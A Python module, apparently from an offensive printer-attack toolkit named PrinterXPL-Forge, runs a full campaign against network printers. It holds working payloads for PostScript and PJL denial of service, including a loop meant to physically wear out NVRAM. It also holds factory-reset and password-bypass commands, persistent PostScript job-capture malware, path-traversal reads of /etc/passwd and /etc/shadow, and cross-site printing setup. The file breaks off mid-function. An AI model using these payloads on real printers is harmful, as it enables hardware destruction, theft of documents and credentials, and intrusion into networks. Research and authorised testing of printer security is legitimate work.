#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PrinterXPL-Forge — Attack Orchestrator
=====================================
Executes a full structured attack campaign against a printer target,
covering every category from the Müller et al. (2017) attack matrix
and extending it with techniques up to 2025.

Attack Matrix (from BlackHat 2017 paper, extended):
┌──────────────────────┬──────────────────────────────────────────────┐
│ Category             │ Attacks                                       │
├──────────────────────┼──────────────────────────────────────────────┤
│ Denial of Service    │ PS infinite loop, showpage redefinition,      │
│                      │ PJL offline mode, physical NVRAM damage,      │
│                      │ CVE-2024-51982 PJL FORMLINES crash,          │
│                      │ connection flood, IPP purge                   │
├──────────────────────┼──────────────────────────────────────────────┤
│ Protection Bypass    │ SNMP factory reset, PML DMCMD reset,         │
│                      │ PS exitserver auth bypass, PIN brute-force,   │
│                      │ PJL lock/unlock bypass                        │
├──────────────────────┼──────────────────────────────────────────────┤
│ Print Job Manip.     │ PS showpage overlay, content replacement,     │
│                      │ job capture + retention, job reprint,         │
│                      │ IPP job manipulation, LPD job injection       │
├──────────────────────┼──────────────────────────────────────────────┤
│ Information Discl.   │ PJL memory access, PS/PJL filesystem,        │
│                      │ credential extraction, job sniffing,          │
│                      │ CORS spoofing, SNMP full MIB,                │
│                      │ network config exfil, cross-site printing     │
├──────────────────────┼──────────────────────────────────────────────┤
│ Network/Pivot        │ Internal host discovery, port scan via SSRF,  │
│                      │ WSD neighbor discovery, SMB pivot,            │
│                      │ web attacker (XSP) payload generation        │
└──────────────────────┴──────────────────────────────────────────────┘
"""

# Author    : Andre Henrique (@mrhenrike)
# GitHub    : https://github.com/mrhenrike
# LinkedIn  : https://linkedin.com/in/mrhenrike
# X/Twitter : https://x.com/mrhenrike

from __future__ import annotations

import logging
import socket
import struct
import time
from dataclasses import dataclass, field
from typing import Dict, List, Optional

_log = logging.getLogger(__name__)

RESET = '\033[0m'
RED   = '\033[1;31m'
YEL   = '\033[1;33m'
GRN   = '\033[0;32m'
CYN   = '\033[1;36m'
DIM   = '\033[2;37m'


# ── Result dataclass ──────────────────────────────────────────────────────────

@dataclass
class AttackResult:
    """Result of a single attack step."""
    category:   str
    attack:     str
    supported:  bool   = False
    vulnerable: bool   = False
    exploited:  bool   = False
    evidence:   str    = ''
    severity:   str    = 'info'  # info / low / medium / high / critical
    note:       str    = ''


@dataclass
class CampaignReport:
    """Full campaign report covering all attack categories."""
    host:          str
    make:          str = ''
    model:         str = ''
    firmware:      str = ''
    printer_langs: List[str] = field(default_factory=list)
    open_ports:    List[int] = field(default_factory=list)

    results:       List[AttackResult] = field(default_factory=list)
    network_map:   object              = None   # NetworkMap instance

    @property
    def critical_findings(self) -> List[AttackResult]:
        return [r for r in self.results if r.severity in ('critical', 'high') and r.vulnerable]

    @property
    def exploited_count(self) -> int:
        return sum(1 for r in self.results if r.exploited)

    def summary(self) -> str:
        vuln  = sum(1 for r in self.results if r.vulnerable)
        expl  = self.exploited_count
        crit  = len(self.critical_findings)
        total = len(self.results)
        return (f"{self.make} {self.model} @ {self.host} | "
                f"{total} tests | {vuln} vulnerable | "
                f"{expl} exploited | {crit} critical")


# ── Raw TCP sender ────────────────────────────────────────────────────────────

def _send_raw(host: str, port: int, data: bytes, timeout: float = 8,
              wait: float = 1.5, read_max: int = 8192) -> bytes:
    """Send raw bytes to host:port and return response."""
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.settimeout(timeout)
        s.sendall(data)
        if wait:
            time.sleep(wait)
        resp = b''
        while len(resp) < read_max:
            try:
                chunk = s.recv(4096)
                if not chunk:
                    break
                resp += chunk
            except (socket.timeout, BlockingIOError):
                break
        s.close()
        return resp
    except Exception as exc:
        _log.debug("_send_raw %s:%d: %s", host, port, exc)
        return b''


UEL = b'\x1b%-12345X'


# ── 1. DENIAL OF SERVICE ──────────────────────────────────────────────────────

def dos_ps_infinite_loop(host: str, port: int = 9100, dry: bool = True,
                         timeout: float = 5) -> AttackResult:
    """
    PostScript infinite loop: `{} loop` — hangs the interpreter permanently.

    The printer stops responding to all jobs until power-cycled.
    Affects: HP, Lexmark, Dell, Kyocera, Ricoh, Xerox, OKI.
    """
    ps = b'%!\n{} loop\n'
    if not dry:
        resp = _send_raw(host, port, UEL + ps + UEL, timeout, wait=2)
    else:
        resp = _send_raw(host, port, UEL + b'%!\n() print flush\n' + UEL, timeout, wait=1)

    supported = len(resp) > 0 or not dry  # port was reachable
    return AttackResult(
        category='DoS',
        attack='ps_infinite_loop',
        supported=supported,
        vulnerable=supported,
        exploited=not dry and supported,
        evidence=f"PS port 9100 reachable, {{}} loop {'sent' if not dry else 'NOT sent (dry-run)'}",
        severity='critical' if not dry else 'high',
        note='CVE pattern: {} loop hangs PostScript interpreter until reboot',
    )


def dos_ps_showpage_redef(host: str, port: int = 9100, dry: bool = True,
                          timeout: float = 5) -> AttackResult:
    """
    Redefine PostScript showpage to an infinite loop — persistent until reboot.

    Uses exitserver to make the change permanent across all subsequent jobs.
    """
    ps_payload = (
        b'%!\n'
        b'serverdict begin 0 exitserver\n'
        b'/showpage { {} loop } bind def\n'
    )
    if not dry:
        resp = _send_raw(host, port, UEL + ps_payload + UEL, timeout)
    else:
        resp = _send_raw(host, port, UEL + b'%!\nproduct == flush\n' + UEL, timeout)

    from utils.ports import PortConfig as _PC_loc
    reachable = port == _PC_loc.resolve('raw') or len(resp) > 0
    return AttackResult(
        category='DoS',
        attack='ps_showpage_redefinition',
        supported=len(resp) > 0,
        vulnerable=len(resp) > 0,
        exploited=not dry,
        evidence=f"exitserver + showpage loop {'injected' if not dry else 'NOT sent (dry)'}",
        severity='high',
        note='Affects all PS printers; requires exitserver support',
    )


def dos_pjl_offline(host: str, port: int = 9100, dry: bool = True,
                    timeout: float = 5) -> AttackResult:
    """
    Take the printer offline via PJL `@PJL OFFLINE` command.

    The printer stops accepting jobs until an operator presses 'Online' button.
    Also attempts `@PJL HOLD` to hold all future jobs indefinitely.
    """
    pjl_payload = UEL + b'@PJL\r\n@PJL OFFLINE\r\n' + UEL
    if dry:
        resp = _send_raw(host, port, UEL + b'@PJL INFO STATUS\r\n' + UEL, timeout)
    else:
        resp = _send_raw(host, port, pjl_payload, timeout)

    return AttackResult(
        category='DoS',
        attack='pjl_offline_mode',
        supported=len(resp) > 0,
        vulnerable=len(resp) > 0,
        exploited=not dry,
        evidence=f"@PJL OFFLINE {'sent' if not dry else 'NOT sent (dry-run)'}",
        severity='medium',
        note='@PJL OFFLINE takes printer offline; operator must re-enable',
    )


def dos_pjl_nvram_damage(host: str, port: int = 9100, dry: bool = True,
                          iterations: int = 100, timeout: float = 10) -> AttackResult:
    """
    Physical damage via NVRAM exhaustion.

    NVRAM has limited write cycles (~100k-1M). Continuously setting long-term
    PJL variables causes premature NVRAM failure (physical damage).
    CVE pattern: @PJL DEFAULT COPIES=X (repeated).

    DANGER: This causes permanent hardware damage. Use only in authorized lab tests.
    """
    if dry:
        resp = _send_raw(host, port, UEL + b'@PJL INFO STATUS\r\n' + UEL, timeout)
        return AttackResult(
            category='DoS',
            attack='pjl_nvram_physical_damage',
            supported=len(resp) > 0,
            vulnerable=len(resp) > 0,
            exploited=False,
            evidence='DRY-RUN: NVRAM damage NOT executed. Printer PJL port is reachable.',
            severity='critical',
            note='@PJL DEFAULT COPIES=X × N — exhausts NVRAM write cycles. Lab only.',
        )

    payload_parts = [UEL, b'@PJL\r\n']
    for i in range(iterations):
        payload_parts.append(f'@PJL DEFAULT COPIES={i % 9 + 1}\r\n'.encode())
    payload_parts.append(UEL)
    resp = _send_raw(host, port, b''.join(payload_parts), timeout, wait=2)

    return AttackResult(
        category='DoS',
        attack='pjl_nvram_physical_damage',
        supported=True,
        vulnerable=True,
        exploited=True,
        evidence=f"Sent {iterations} NVRAM write cycles via @PJL DEFAULT",
        severity='critical',
        note='NVRAM wear-out attack — accumulates over time',
    )


def dos_cve_2024_51982(host: str, port: int = 9100, timeout: float = 5) -> AttackResult:
    """
    CVE-2024-51982: DoS via malformed PJL FORMLINES variable (Brother/Ricoh).

    Setting FORMLINES to a non-numeric value crashes the printer and it
    continues crashing after each reboot until the variable is cleared.
    """
    pjl_crash = UEL + b'@PJL SET FORMLINES=CRASH\r\n' + UEL
    before = _send_raw(host, port, UEL + b'@PJL INFO STATUS\r\n' + UEL, timeout)
    _send_raw(host, port, pjl_crash, timeout, wait=2)
    time.sleep(2)
    after = _send_raw(host, port, UEL + b'@PJL INFO STATUS\r\n' + UEL, timeout)

    crashed = len(before) > 0 and len(after) == 0
    return AttackResult(
        category='DoS',
        attack='cve_2024_51982_formlines',
        supported=len(before) > 0,
        vulnerable=len(before) > 0,
        exploited=crashed,
        evidence=f"Before: {len(before)}B | After: {len(after)}B | Crashed: {crashed}",
        severity='high',
        note='CVE-2024-51982: affects Brother, FUJIFILM, Ricoh; CVSS 7.5',
    )


# ── 2. PROTECTION BYPASS ──────────────────────────────────────────────────────

def bypass_pjl_password(host: str, port: int = 9100,
                         timeout: float = 8) -> AttackResult:
    """
    Attempt to bypass PJL password protection by reading protected variables.

    Most PJL implementations allow password variable to be read:
    @PJL INFO VARIABLES returns PASSWORD even if set.
    Also attempts @PJL LOCK/UNLOCK bypass.
    """
    query = UEL + b'@PJL INFO VARIABLES\r\n' + UEL
    resp  = _send_raw(host, port, query, timeout)
    text  = resp.decode('latin-1', errors='replace')

    password = ''
    m = re.search(r'PASSWORD\s*=\s*(\d+)', text) if resp else None
    if m:
        import re as _re
        m2 = _re.search(r'PASSWORD\s*=\s*(\S+)', text)
        if m2:
            password = m2.group(1)

    import re as _re
    pw_m = _re.search(r'PASSWORD\s*[=:]\s*(\S+)', text)
    if pw_m:
        password = pw_m.group(1)

    return AttackResult(
        category='ProtectionBypass',
        attack='pjl_password_disclosure',
        supported=len(resp) > 0,
        vulnerable=bool(password),
        exploited=bool(password),
        evidence=f"PASSWORD={'FOUND: ' + password if password else 'not disclosed'}",
        severity='high' if password else 'low',
        note='@PJL INFO VARIABLES may reveal cleartext password',
    )


def bypass_pml_factory_reset(host: str, port: int = 9100, dry: bool = True,
                              timeout: float = 8) -> AttackResult:
    """
    PML factory reset via @PJL DMCMD (HP printers).

    Restores factory defaults, clearing all passwords and access controls.
    Command: @PJL DMCMD ASCIIHEX="040006020501010301040106"
    """
    import re as _re
    if dry:
        resp = _send_raw(host, port, UEL + b'@PJL INFO ID\r\n' + UEL, timeout)
        return AttackResult(
            category='ProtectionBypass',
            attack='pml_factory_reset',
            supported=len(resp) > 0,
            vulnerable=len(resp) > 0,
            exploited=False,
            evidence="DRY-RUN: port reachable, reset NOT sent. HP model detected: "
                     + _re.sub(r'[^\x20-\x7e]', '', resp.decode('latin-1', 'replace'))[:40],
            severity='critical',
            note='@PJL DMCMD ASCIIHEX="040006020501010301040106" — HP factory reset',
        )

    reset_cmd = UEL + b'@PJL DMCMD ASCIIHEX="040006020501010301040106"\r\n' + UEL
    resp = _send_raw(host, port, reset_cmd, timeout)
    return AttackResult(
        category='ProtectionBypass',
        attack='pml_factory_reset',
        supported=True,
        vulnerable=True,
        exploited=True,
        evidence='@PJL DMCMD ASCIIHEX factory reset command sent',
        severity='critical',
        note='Clears all passwords — used by @PJL DMCMD on HP printers',
    )


def bypass_ps_exitserver(host: str, port: int = 9100,
                          timeout: float = 8) -> AttackResult:
    """
    PostScript exitserver bypass — gain persistent system-level access.

    `serverdict begin 0 exitserver` escapes the userdict jail and allows
    permanent modification of the server dictionary. Most PS printers
    accept `0` (zero) as the server password by default.

    Once exitserver is successful, all subsequent PS can:
    - Redefine any operator (showpage, filter, etc.)
    - Read/write the printer filesystem
    - Capture all future print jobs
    """
    test_ps = (
        b'%!\n'
        b'serverdict begin 0 exitserver\n'
        b'(EXITSERVER_OK) print flush\n'
    )
    resp = _send_raw(host, port, UEL + test_ps + UEL, timeout)
    text = resp.decode('latin-1', errors='replace')
    success = 'EXITSERVER_OK' in text

    return AttackResult(
        category='ProtectionBypass',
        attack='ps_exitserver',
        supported=len(resp) > 0,
        vulnerable=success,
        exploited=success,
        evidence=f"exitserver response: {text[:60]}",
        severity='critical' if success else 'info',
        note='exitserver gives permanent operator-level PS access; password=0 default',
    )


def bypass_snmp_reset(host: str, timeout: float = 8) -> AttackResult:
    """
    Use SNMP write (community 'private') to reset printer to factory defaults.

    Some printers expose a reset OID that can be triggered via SNMP SET.
    Also tries HP JetDirect reset OID.
    """
    from protocols.storage import snmp_write
    reset_oids = [
        ('1.3.6.1.4.1.11.2.3.9.4.2.1.1.3.0',    '1'),   # HP reset
        ('1.3.6.1.4.1.2699.1.1.1.1.1.1.2.1.1.0', '1'),   # generic
    ]
    for oid, val in reset_oids:
        ok = snmp_write(host, oid, val, community='private', timeout=timeout)
        if ok:
            return AttackResult(
                category='ProtectionBypass',
                attack='snmp_factory_reset',
                supported=True, vulnerable=True, exploited=True,
                evidence=f"SNMP SET {oid}={val} accepted (community=private)",
                severity='critical',
                note='SNMP write reset — clears all security settings',
            )

    return AttackResult(
        category='ProtectionBypass',
        attack='snmp_factory_reset',
        supported=False, vulnerable=False, exploited=False,
        evidence='SNMP write reset not accepted (community=private rejected)',
        severity='info',
    )


# ── 3. PRINT JOB MANIPULATION ────────────────────────────────────────────────

def job_overlay(host: str, port: int = 9100, eps_content: str = '',
                dry: bool = True, timeout: float = 8) -> AttackResult:
    """
    Inject PostScript overlay on all subsequent print jobs.

    Uses exitserver + showpage redefinition to prepend attacker content
    (watermarks, logos, propaganda) on every page printed.

    Default overlay: prints 'COMPROMISED' across each page.
    """
    if not eps_content:
        eps_content = (
            '0.3 setgray\n'
            '/Helvetica-Bold findfont 72 scalefont setfont\n'
            '50 400 moveto\n'
            '45 rotate\n'
            '(COMPROMISED) show\n'
            '0 setgray\n'
        )

    overlay_ps = (
        b'%!\n'
        b'serverdict begin 0 exitserver\n'
        b'currentdict /showpage_real known false eq\n'
        b'{/showpage_real systemdict /showpage get def} if\n'
        b'/showpage {\n'
        b'  save /showpage {} bind def\n'
        + eps_content.encode()
        + b'\n  restore showpage_real\n'
        b'} def\n'
    )

    if not dry:
        resp = _send_raw(host, port, UEL + overlay_ps + UEL, timeout)
    else:
        resp = _send_raw(host, port, UEL + b'%!\nproduct == flush\n' + UEL, timeout)

    return AttackResult(
        category='PrintJobManipulation',
        attack='ps_showpage_overlay',
        supported=len(resp) > 0,
        vulnerable=len(resp) > 0,
        exploited=not dry,
        evidence=f"Overlay {'injected' if not dry else 'NOT sent (dry-run)'}; exitserver required",
        severity='high',
        note='Every future page will include the overlay until printer reboot',
    )


def job_capture_start(host: str, port: int = 9100,
                      dry: bool = True, timeout: float = 8) -> AttackResult:
    """
    Inject PostScript print job capture malware.

    Uses exitserver + BeginPage hook to intercept and store all future
    print jobs in the printer's permanent dictionary. Jobs can later be
    fetched by the attacker.

    This is advisory 1/6 from Müller et al. (2017) — affects ALL PostScript
    printers since 1985 as it uses legitimate PS language constructs.
    """
    capture_ps = (
        b'%!\n'
        b'serverdict begin 0 exitserver\n'
        b'/permanent {/currentfile {serverdict begin 0 exitserver} def} def\n'
        b'permanent /filter {\n'
        b'  /rndname (job_) rand 16 string cvs strcat (.ps) strcat def\n'
        b'  false echo\n'
        b'  /newjob true def\n'
        b'  currentdict /currentfile undef\n'
        b'  /max 40000 def\n'
        b'  /slots max array def\n'
        b'  /counter 2 dict def\n'
        b'  counter (slot) 0 put\n'
        b'  counter (line) 0 put\n'
        b'  (capturedict) where {pop}\n'
        b'  {/capturedict max dict def} ifelse\n'
        b'  capturedict rndname slots put\n'
        b'  /slotnum {counter (slot) get} def\n'
        b'  /linenum {counter (line) get} def\n'
        b'  /capture {\n'
        b'    linenum 0 eq {\n'
        b'      /lines max array def\n'
        b'      slots slotnum lines put\n'
        b'    } if\n'
        b'    dup lines exch linenum exch put\n'
        b'    counter (line) linenum 1 add put\n'
        b'    linenum max eq {\n'
        b'      counter (slot) linenum 1 add put\n'
        b'      counter (line) 0 put\n'
        b'    } if\n'
        b'  } def\n'
        b'  { newjob {(%!\\ncurrentfile /ASCII85Decode filter ) capture\n'
        b'    pop /newjob false def} if (%lineedit) (r) file\n'
        b'    dup bytesavailable string readstring pop capture pop\n'
        b'  } loop\n'
        b'} def\n'
    )

    if not dry:
        resp = _send_raw(host, port, UEL + capture_ps + UEL, timeout)
    else:
        resp = _send_raw(host, port, UEL + b'%!\nproduct == flush\n' + UEL, timeout)

    return AttackResult(
        category='PrintJobManipulation',
        attack='ps_job_capture_start',
        supported=len(resp) > 0,
        vulnerable=len(resp) > 0,
        exploited=not dry,
        evidence=f"Capture PS {'injected' if not dry else 'NOT sent (dry-run)'}",
        severity='critical',
        note='Advisory 1/6 Müller 2017: all PS printers since 1985 affected',
    )


def job_capture_list(host: str, port: int = 9100, timeout: float = 8) -> AttackResult:
    """
    List print jobs captured by job_capture_start().

    Returns list of captured job names stored in capturedict.
    """
    list_ps = (
        b'%!\n'
        b'(HTTP/1.0 200 OK\\n) print\n'
        b'(Access-Control-Allow-Origin: *\\n) print\n'
        b'(Content-Type: text/plain\\n\\n) print\n'
        b'(capturedict) where {\n'
        b'  (Captured jobs:\\n) print\n'
        b'  capturedict { exch == } forall\n'
        b'} { (No jobs captured) print } ifelse\n'
        b'flush\n'
    )
    resp = _send_raw(host, port, UEL + list_ps + UEL, timeout)
    text = resp.decode('latin-1', errors='replace')

    jobs = []
    if 'capturedict' in text.lower() or 'job_' in text:
        import re as _re
        jobs = _re.findall(r'job_\w+', text)

    return AttackResult(
        category='PrintJobManipulation',
        attack='ps_job_capture_list',
        supported=len(resp) > 0,
        vulnerable=bool(jobs),
        exploited=bool(jobs),
        evidence=f"Captured jobs: {jobs or 'none'}",
        severity='critical' if jobs else 'info',
    )


# ── 4. INFORMATION DISCLOSURE ────────────────────────────────────────────────

import re as _re


def info_pjl_memory_access(host: str, port: int = 9100,
                             timeout: float = 8) -> AttackResult:
    """
    Read printer memory via PJL DMINFO.

    PJL DMINFO provides access to device-specific memory regions including
    NVRAM contents, configuration, stored credentials, and job data.
    """
    queries = [
        b'@PJL DMINFO ASCIIHEX\r\n',
        b'@PJL INFO MEMORY\r\n',
        b'@PJL INFO STATUS\r\n',
        b'@PJL RDYMSG\r\n',
    ]
    all_resp = b''
    for q in queries:
        resp = _send_raw(host, port, UEL + b'@PJL\r\n' + q + UEL, timeout, wait=0.5)
        all_resp += resp

    text = all_resp.decode('latin-1', errors='replace')
    has_mem = 'MEMORY' in text.upper() or 'TOTAL' in text.upper()

    return AttackResult(
        category='InfoDisclosure',
        attack='pjl_memory_access',
        supported=len(all_resp) > 0,
        vulnerable=has_mem,
        exploited=has_mem,
        evidence=_re.sub(r'[^\x20-\x7e]', ' ', text)[:200],
        severity='medium',
        note='PJL DMINFO + INFO MEMORY — may expose configuration and credentials',
    )


def info_ps_filesystem(host: str, port: int = 9100,
                        path: str = '/', timeout: float = 8) -> AttackResult:
    """
    List PostScript filesystem via filenameforall.

    Reads directory contents from the printer's internal filesystem.
    Can reveal config files, certificates, stored credentials, print jobs.

    Common interesting paths:
      /  (root), %disk0%, %rom%, %ram%
    """
    ls_ps = (
        b'%!\n'
        b'/str 256 string def\n'
        b'(HTTP/1.0 200 OK\\n) print\n'
        b'(Access-Control-Allow-Origin: *\\n) print\n'
        b'(Content-Type: text/plain\\n\\n) print\n'
        + f'({path}*) '.encode()
        + b'{{ == }} str filenameforall\n'
        b'flush\n'
    )
    resp = _send_raw(host, port, UEL + ls_ps + UEL, timeout)
    text = resp.decode('latin-1', errors='replace')

    files = _re.findall(r'[^\x00-\x1f\x7f-\xff]{3,80}', text)
    files = [f for f in files if '/' in f or '.' in f]

    return AttackResult(
        category='InfoDisclosure',
        attack='ps_filesystem_list',
        supported=len(resp) > 0,
        vulnerable=bool(files),
        exploited=bool(files),
        evidence=f"Files found: {files[:10]}",
        severity='high' if files else 'info',
        note='filenameforall lists all printer filesystem entries',
    )


def info_ps_credential_disclosure(host: str, port: int = 9100,
                                    timeout: float = 10) -> AttackResult:
    """
    Attempt to read credential-containing files via PostScript.

    Tries to read: /etc/passwd, /.profile, /init, config files, web auth files.
    Uses (filename)(r) file to open and read file contents.
    """
    target_files = [
        '%disk0%/../../../etc/passwd',
        '%disk0%/../../../etc/shadow',
        '%disk0%/../../../.profile',
        '%disk0%/../../../init',
        '%disk0%/../../../tmp',
        '%rom%/dev/null',
    ]

    all_creds = []
    for fpath in target_files:
        read_ps = (
            b'%!\n'
            b'/str 65535 string def\n'
            b'(' + fpath.encode() + b') (r) file\n'
            b'dup str readstring pop\n'
            b'(FILE_CONTENT:\\n) print\n'
            b'str cvs print flush\n'
        )
        resp = _send_raw(host, port, UEL + read_ps + UEL, timeout, wait=1)
        text = resp.decode('latin-1', errors='replace')
        if 'FILE_CONTENT' in text or 'root:' in text:
            all_creds.append(fpath)

    # Also try PJL filesystem download
    for pjl_path in ['0:/../../../etc/passwd', '0:/.profile']:
        pjl_cmd = (UEL + b'@PJL\r\n'
                   + f'@PJL FSDOWNLOAD FORMAT:BINARY SIZE=65535 NAME="{pjl_path}"\r\n'.encode()
                   + UEL)
        resp = _send_raw(host, port, pjl_cmd, timeout)
        text = resp.decode('latin-1', errors='replace')
        if 'root:' in text or 'password' in text.lower():
            all_creds.append(f"PJL:{pjl_path}")

    return AttackResult(
        category='InfoDisclosure',
        attack='credential_disclosure',
        supported=True,
        vulnerable=bool(all_creds),
        exploited=bool(all_creds),
        evidence=f"Readable credential files: {all_creds}",
        severity='critical' if all_creds else 'info',
        note='Path traversal via PS filenameforall or PJL FSDOWNLOAD',
    )


def info_cors_spoofing_probe(host: str, port: int = 9100,
                              timeout: float = 8) -> AttackResult:
    """
    Test CORS spoofing capability — can the printer act as an HTTP server?

    Sends a PostScript job that outputs HTTP headers including
    Access-Control-Allow-Origin: * — making the printer act as a web server
    that JavaScript (from evil.com) can read.

    This is the basis for web attacker (cross-site printing) attacks.
    """
    cors_ps = (
        b'%!\n'
        b'(HTTP/1.0 200 OK\\n) print\n'
        b'(Server: PrinterXPL-Forge-Test\\n) print\n'
        b'(Access-Control-Allow-Origin: *\\n) print\n'
        b'(Content-Type: text/plain\\n\\n) print\n'
        b'product print\n'
        b'(|) print\n'
        b'version print\n'
        b'(|) print\n'
        b'revision 8 string cvs print\n'
        b'(\\n) print flush\n'
    )
    resp = _send_raw(host, port, UEL + cors_ps + UEL, timeout)
    text = resp.decode('latin-1', errors='replace')

    has_cors = 'Access-Control-Allow-Origin' in text
    has_product = bool(_re.search(r'[A-Za-z]{3,}', text))

    return AttackResult(
        category='InfoDisclosure',
        attack='ps_cors_spoofing',
        supported=len(resp) > 0,
        vulnerable=has_cors or has_product,
        exploited=has_cors,
        evidence=f"CORS in response: {has_cors} | Product: {text[:80]}",
        severity='high' if has_cors else 'medium',
        note='Enables web attacker (XSP) to bypass same-origin policy via port 9100',
    )


# ── Full campaign orchestrator ─────────────────────────────────────────────────

def run_campaign(
    host:          str,
    make:          str        = '',
    model:         str        = '',
    firmware:      str        = '',
    printer_langs: List[str]  = None,
    open_ports:    List[int]  = None,
    dry_run:       bool       = True,
    timeout:       float      = 8,
    run_netmap:    bool       = False,
    verbose:       bool       = True,
) -> CampaignReport:
    """
    Execute the full printer attack campaign.

    Runs all attack categories from the matrix, respecting dry_run safety.
    With dry_run=True (default), no destructive actions are taken —
    only capabilities are probed and vulnerabilities reported.

    Args:
        dry_run:    Safe mode — probe capabilities without exploiting.
        run_netmap: Also run full network mapping (slow — scans /24).
    """
    langs = [l.upper() for l in (printer_langs or [])]
    ports = set(open_ports or [])
    report = CampaignReport(
        host=host, make=make, model=model,
        firmware=firmware, printer_langs=langs,
        open_ports=list(ports),
    )

    def _run(fn, *args, **kwargs) -> AttackResult:
        try:
            return fn(*args, **kwargs)
        except Exception as exc:
            return AttackResult(
                category='error', attack=fn.__name__,
                evidence=str(exc)[:60], severity='info',
            )

    from utils.ports import PortConfig as _PC
    _raw_port = _PC.resolve('raw')
    _ipp_port = _PC.resolve('ipp')
    pjl_port  = _raw_port if _raw_port in ports else None
    ps_avail  = _raw_port in ports  # PS goes over RAW port too

    if verbose:
        print(f"\n{'='*65}")
        print(f"  ATTACK CAMPAIGN — {make} {model} @ {host}")
        print(f"  Mode: {'DRY-RUN (no destructive actions)' if dry_run else 'LIVE EXPLOIT'}")
        print(f"{'='*65}\n")

    # ── DoS ──────────────────────────────────────────────────────────────────
    if verbose:
        print(f"  {CYN}[1/5] DENIAL OF SERVICE{RESET}")

    if ps_avail or 'PS' in langs or 'POSTSCRIPT' in langs:
        r = _run(dos_ps_infinite_loop, host, _raw_port, dry_run, timeout)
        report.results.append(r)
        _print_result(r, verbose)

        r = _run(dos_ps_showpage_redef, host, _raw_port, dry_run, timeout)
        report.results.append(r)
        _print_result(r, verbose)

    if pjl_port or 'PJL' in langs:
        r = _run(dos_pjl_offline, host, _raw_port, dry_run, timeout)
        report.results.append(r)
        _print_result(r, verbose)

        r = _run(dos_pjl_nvram_damage, host, _raw_port, dry_run, 50, timeout)
        report.results.append(r)
        _print_result(r, verbose)

    # Always test CVE-2024-51982 (Brother/Ricoh)
    r = _run(dos_cve_2024_51982, host, _raw_port, timeout)
    report.results.append(r)
    _print_result(r, verbose)

    # IPP purge
    if _ipp_port in ports:
        from protocols.ipp_attacks import purge_all_jobs, discover_endpoints
        eps = discover_endpoints(host, timeout)
        if eps:
            ep     = eps[0]
            purge  = purge_all_jobs(host, ep['port'], ep['path'], ep['scheme'], timeout)
            report.results.append(AttackResult(
                category='DoS', attack='ipp_purge_jobs',
                supported=True, vulnerable=purge['success'],
                exploited=not dry_run and purge['success'],
                evidence=purge['message'],
                severity='medium' if purge['success'] else 'info',
            ))
            _print_result(report.results[-1], verbose)

    # ── Protection Bypass ─────────────────────────────────────────────────────
    if verbose:
        print(f"\n  {CYN}[2/5] PROTECTION BYPASS{RESET}")

    r = _run(bypass_pjl_password, host, _raw_port, timeout)
    report.results.append(r)
    _print_result(r, verbose)

    r = _run(bypass_pml_factory_reset, host, _raw_port, dry_run, timeout)
    report.results.append(r)
    _print_result(r, verbose)

    r = _run(bypass_ps_exitserver, host, _raw_port, timeout)
    report.results.append(r)
    _print_result(r, verbose)

    r = _run(bypass_snmp_reset, host, timeout)
    report.results.append(r)
    _print_result(r, verbose)

    # ── Print Job Manipulation ────────────────────────────────────────────────
    if verbose:
        print(f"\n  {CYN}[3/5] PRINT JOB MANIPULATION{RESET}")

    r = _run(job_overlay, host, _raw_port, '', dry_run, timeout)
    report.results.append(r)
    _print_result(r, verbose)

    r = _run(job_capture_start, host, _raw_port, dry_run, timeout)
    report.results.append(r)
    _print_result(r, verbose)

    r = _run(job_capture_list, host, _raw_port, timeout)
    report.results.append(r)
    _print_result(r, verbose)

    # ── Information Disclosure ────────────────────────────────────────────────
    if verbose:
        print(f"\n  {CYN}[4/5] INFORMATION DISCLOSURE{RESET}")

    r = _run(info_pjl_memory_access, host, _raw_port, timeout)
    report.results.append(r)
    _print_result(r, verbose)

    r = _run(info_ps_filesystem, host, _raw_port, '/', timeout)
    report.results.append(r)
    _print_result(r, verbose)

    r = _run(info_ps_credential_disclosure, host, _raw_port, timeout)
    report.results.append(r)
    _print_result(r, verbose)

    r = _run(info_cors_spoofing_probe, host, _raw_port, timeout)
    report.results.append(r)
    _print_result(r, verbose)

    # SNMP MIB + network info
    from protocols.storage import snmp_dump
    mib = snmp_dump(host, verbose=False)
    report.results.append(AttackResult(
        category='InfoDisclosure', attack='snmp_mib_dump',
        supported=bool(mib), vulnerable=bool(mib),
        exploited=bool(mib),
        evidence=f"{len(mib)} OIDs retrieved",
        severity='medium' if mib else 'info',
    ))
    _print_result(report.results[-1], verbose)

    # ── Network Mapping ───────────────────────────────────────────────────────
    if verbose:
        print(f"\n  {CYN}[5/5] NETWORK MAPPING{RESET}")

    if run_netmap:
        from protocols.network_map import build_network_map, print_network_map
        nm = build_network_map(host, timeout=timeout, verbose=verbose)
        report.network_map = nm
        report.results.append(AttackResult(
            category='Network',
            attack='network_map',
            supported=True,
            vulnerable=bool(nm.attack_paths),
            exploited=False,
            evidence=nm.summary(),
            severity='high' if nm.attack_paths else 'info',
        ))
    else:
        # Quick pivot check
        from protocols.ssrf_pivot import pivot_audit
        from protocols.ipp_attacks import discover_endpoints
        eps = discover_endpoints(host, timeout)
        if eps:
            ep   = eps[0]
            pres = pivot_audit(host, ep['port'], ep['path'], ep['scheme'],
                               timeout, verbose=False)
            report.results.append(AttackResult(
                category='Network',
                attack='ssrf_pivot',
                supported=True,
                vulnerable=bool(pres['risk']),
                exploited=bool(pres['internal_hosts']),
                evidence=f"Risks: {pres['risk']} | Hosts: {pres['internal_hosts']}",
                severity='high' if 'IPP_SSRF_CAPABLE' in pres['risk'] else 'medium',
            ))
            _print_result(report.results[-1], verbose)

    return report


def _print_result(r: AttackResult, verbose: bool) -> None:
    if not verbose:
        return
    sev_color = {
        'critical': RED,
        'high':     '\033[0;31m',
        'medium':   YEL,
        'low':      '\033[1;34m',
        'info':     DIM,
    }.get(r.severity, '')
    icon = f"{RED}[EXPLOITED]{RESET}" if r.exploited else (
           f"{YEL}[VULN]{RESET}" if r.vulnerable else (
           f"{GRN}[OK]{RESET}" if r.supported else f"{DIM}[N/A]{RESET}"))
    print(f"  {icon} {sev_color}{r.category}/{r.attack}{RESET}")
    if r.evidence:
        print(f"       {DIM}{r.evidence[:90]}{RESET}")


def print_campaign_report(report: CampaignReport) -> None:
    """Pretty-print a full CampaignReport."""
    print(f"\n{'='*70}")
    print(f"  CAMPAIGN REPORT — {report.host}")
    print(f"{'='*70}")
    print(f"  Target  : {report.make} {report.model} {report.firmware}")
    print(f"  Summary : {report.summary()}")

    if report.critical_findings:
